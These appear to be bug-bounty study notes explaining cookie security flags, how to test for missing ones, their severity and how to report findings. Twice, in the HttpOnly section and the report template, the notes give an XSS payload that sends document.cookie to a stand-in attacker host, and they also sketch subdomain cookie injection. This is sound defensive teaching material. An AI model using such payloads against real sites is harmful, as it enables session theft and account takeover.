# Cookie Security Flags

> **OWASP:** A02:2021 — Cryptographic Failures / Session Management  
> **Severity:** Medium → Critical (missing HttpOnly + XSS = account takeover)  
> **Quick check:** DevTools → Application → Cookies → check every flag column

---

## What are Cookie Security Flags?

Attributes added to `Set-Cookie` headers that control how browsers handle cookies. Missing flags = attackers can steal, intercept, or forge session cookies. Three lines of config that most apps skip.

---

## 6 Cookie Flags

### 01 · HttpOnly — Blocks XSS Theft
```
What it does: JavaScript cannot access the cookie at all.
Missing = document.cookie in XSS payload steals session token.

Set-Cookie: session=abc123; HttpOnly

Attack without it:
<script>
  fetch('https://attacker.com/?c=' + document.cookie)
</script>
→ Session token sent to attacker — full account takeover

Test: Open DevTools console → type document.cookie
→ If session cookie appears = HttpOnly missing = report it!
```

### 02 · Secure — Blocks MitM
```
What it does: Cookie only transmitted over HTTPS, never HTTP.
Missing = cookie sent in plaintext if user visits http:// version.

Set-Cookie: session=abc123; Secure

Attack without it:
1. Victim visits http://target.com (no HTTPS)
2. Attacker on same network intercepts HTTP traffic
3. Session cookie visible in plaintext in Wireshark/Burp
→ Full session hijack

Test: Intercept traffic to HTTP endpoint
→ Does Set-Cookie response appear? = Secure flag missing
```

### 03 · SameSite — Blocks CSRF
```
What it does: Controls when cookie is sent on cross-site requests.

Values:
SameSite=Strict  → cookie NEVER sent cross-site (most secure)
SameSite=Lax     → cookie sent only for top-level GET navigation
SameSite=None    → cookie always sent cross-site (requires Secure)

Missing/None attack:
→ CSRF — cross-site form submit sends cookie automatically
→ See Day 8 CSRF notes for full exploitation

Set-Cookie: session=abc123; SameSite=Strict
```

### 04 · Expires / Max-Age — Limits Lifespan
```
What it does: Sets when cookie expires and gets deleted.
Missing = session cookie lives until browser closes (or forever for persistent).

Set-Cookie: session=abc123; Max-Age=3600       # expires in 1 hour
Set-Cookie: session=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT

Impact of missing expiry:
→ Stolen cookie works indefinitely — attacker keeps access forever
→ Escalate severity of session theft finding

Max-Age=0 = delete the cookie immediately (use for logout)
```

### 05 · Path & Domain Scope — Limits Exposure
```
What it does: Restricts which paths and subdomains receive the cookie.

Set-Cookie: session=abc123; Path=/app; Domain=target.com

Without scope restrictions:
→ Cookie sent to ALL paths: /admin, /api, /debug, /backup
→ Cookie sent to ALL subdomains if Domain= not set correctly

Best practice:
Path=/          = sent everywhere (default if not set)
Path=/app       = only sent to /app and below
Domain=         = not set = only exact host (most restrictive)
Domain=.target.com = sent to all subdomains (risky!)
```

### 06 · __Host- / __Secure- Prefix — Strongest Protection
```
What it does: Browser enforces additional security requirements.

__Secure- prefix requires:
- Must have Secure flag
- Must be set from HTTPS

__Host- prefix requires:
- Must have Secure flag
- Must have Path=/
- Must NOT have Domain= attribute
- Can only be set from HTTPS

Set-Cookie: __Host-session=abc123; Secure; Path=/; HttpOnly

Attack without prefix:
1. Attacker finds subdomain takeover: evil.target.com
2. Sets cookie: Set-Cookie: session=EVIL; Domain=target.com
3. Victim's browser sends attacker cookie to main domain!

__Host- prefix blocks this entirely — browser rejects it.
```

---

## Perfect Session Cookie

```
Set-Cookie: __Host-session=RANDOM_TOKEN_HERE;
  Secure;
  HttpOnly;
  SameSite=Strict;
  Path=/;
  Max-Age=3600
```

---

## Checklist

```
☐  DevTools → Application → Cookies → check every flag column
☐  Missing HttpOnly? test XSS → document.cookie should return nothing
☐  Missing Secure? intercept HTTP traffic → is cookie visible?
☐  SameSite=None or missing? test CSRF attack
☐  No Max-Age / Expires? stolen cookie works forever — escalate severity
☐  Subdomain cookie scope? test __Host- prefix bypass
☐  Check logout — does it properly clear cookie with Max-Age=0?
```

---

## Quick Cookie Audit

```bash
# Check response headers for Set-Cookie
curl -I https://target.com/login -c /dev/null

# Look for these in Set-Cookie response:
# HttpOnly ✓ / ✗
# Secure   ✓ / ✗  
# SameSite ✓ / ✗

# Python quick check
python3 -c "
import urllib.request
r = urllib.request.urlopen('https://target.com')
for h in r.headers.get_all('Set-Cookie') or []:
    print(h)
"
```

---

## Severity by Flag

| Missing Flag | Attack Enabled | Severity |
|-------------|---------------|----------|
| HttpOnly | XSS session theft | High (chains to Critical) |
| Secure | MitM plaintext theft | Medium |
| SameSite | CSRF | Medium-High |
| Max-Age | Persistent stolen session | Low (escalates others) |
| Path scope | Over-exposed cookie | Low |
| __Host- prefix | Subdomain cookie override | Medium |

---

## Report Template

```
Title: Session Cookie Missing HttpOnly Flag

Severity: High

Endpoint: POST /api/login (Set-Cookie response)

Steps to Reproduce:
1. Log into target.com
2. Open DevTools → Application → Cookies
3. Observe: session cookie has HttpOnly = false
4. Open console, type: document.cookie
5. Session token is returned — accessible via JavaScript

Proof of Concept (requires XSS):
<script>
  fetch('https://attacker.com/steal?c='+document.cookie)
</script>

Impact:
Any XSS vulnerability (stored/reflected) can steal the session
cookie via document.cookie → full account takeover.

Remediation:
Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

---

*Daily Bug Bounty notes — follow for more.*
